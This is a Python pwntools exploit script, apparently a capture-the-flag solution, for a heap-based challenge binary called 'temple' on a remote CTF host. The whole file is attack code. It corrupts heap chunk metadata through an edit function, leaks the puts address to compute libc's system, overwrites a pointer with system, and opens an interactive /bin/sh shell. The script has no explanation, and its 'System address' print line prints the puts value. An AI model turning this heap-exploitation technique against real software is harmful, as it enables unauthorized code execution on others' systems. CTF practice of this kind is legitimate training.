import struct

from pwn import *


prompt = 'Your choice:'


def take(pc, index):
    pc.sendline('1')
    pc.recvuntil('you seek?:')
    pc.sendline(str(index))
    return pc.recvuntil(prompt)

def give(pc, count, wisdom):
    pc.sendline('2')
    pc.recvuntil('you hold?:')
    pc.sendline(str(count))
    pc.recvuntil(' your wisdom?:')
    pc.sendline(wisdom)
    return pc.recvuntil(prompt)


def rethink(pc, index, wisdom, intr=False):
    pc.sendline('3')
    pc.recvuntil('to rethink?:')
    pc.sendline(str(index))
    pc.recvuntil('this differently?:')
    pc.sendline(wisdom)
    return pc.recvuntil(prompt)


def to_int(addr):
    return struct.unpack('Q', addr)[0]


def to_addr(n):
    return struct.pack('Q', n)


def main():

    libc = ELF('./libc.so.6')
    # libc = ELF('/lib/x86_64-linux-gnu/libc-2.24.so')

    # pc = process('./temple')
    pc = remote('temple.tuctf.com', 4343)
    pc.recvuntil(prompt)

    give(pc, 32, '/bin/sh')
    give(pc, 32, 'BBBB')
    give(pc, 32, 'CCCC')
    give(pc, 32, 'DDDD')
    give(pc, 32, 'EEEE')
    give(pc, 32, 'FFFF')
    give(pc, 32, 'GGGG')
    give(pc, 32, 'HHHH')
    give(pc, 32, 'IIII')
    give(pc, 32, 'JJJJ')
    give(pc, 32, 'KKKK')
    give(pc, 32, 'FFFF')
    give(pc, 32, 'GGGG')
    give(pc, 32, 'HHHH')
    give(pc, 32, 'IIII')
    give(pc, 32, 'JJJJ')
    give(pc, 32, 'KKKK')

    rethink(pc, 10, 'BBBBBB\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x90')
    take(pc, 11)
    give(pc, 32, '\xff\xff\x00\x00\x00\x00\x00\x00\x18\x30\x60\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x10\x1c\x40\x00\x00\x00\x00\x00')
    print(pc.recvuntil(':'))

    puts   = take(pc, 10)[1:9]
    system = to_addr(to_int(puts) - libc.symbols['puts'] + libc.symbols['system'])
    print(f'Puts address:   {hex(to_int(puts))}')
    print(f'System address: {hex(to_int(puts))}')

    ################################

    give(pc, 32, 'LLLL')
    give(pc, 32, 'LLLL')

    ################################

    rethink(pc, 18, 'BBBBBB\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x90')
    take(pc, 19)
    give(pc, 32, '\xff\xff\x00\x00\x00\x00\x00\x00\x98\x30\x60\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x10\x1c\x40\x00\x00\x00\x00\x00')
    pc.recvuntil(':')


    rethink(pc, 18, system)
    pc.sendline('/bin/sh\x00')

    pc.interactive()


if __name__ == '__main__':
    main()